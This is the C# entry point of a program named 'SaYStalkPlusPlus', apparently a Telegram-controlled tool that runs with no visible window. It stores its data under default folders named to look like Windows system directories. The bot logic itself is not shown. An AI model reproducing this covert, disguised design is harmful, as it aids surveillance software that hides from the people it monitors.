using DotNetEnv;
using SaYStalkPlusPlus.src;

namespace SaYStalkPlusPlus
{
    internal static class Program
    {
        public static string TempFolder { get; private set; } 
        public static string FileToSaveIds { get; private set; } 
        [STAThread]
        static async Task Main()
        {

            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Env.Load();
            string? botToken = Environment.GetEnvironmentVariable("TOKEN");
            if (botToken is null)
            {
                MessageBox.Show("No telegram token provided");
                return;
            }
            string? _tempFolder = Environment.GetEnvironmentVariable("TEMPFOLDER");
            TempFolder = _tempFolder ?? "C:\\Users\\Public\\Documents\\Windows";

            string? _fileToSaveIds = Environment.GetEnvironmentVariable("FILETOSAVEIDS");
            FileToSaveIds = _fileToSaveIds ?? "C:\\Users\\Public\\Documents\\WinDocLib";
        
            Bot bot = new(botToken);
            await bot.StartAsync();

            Application.Run();
        }
    }
}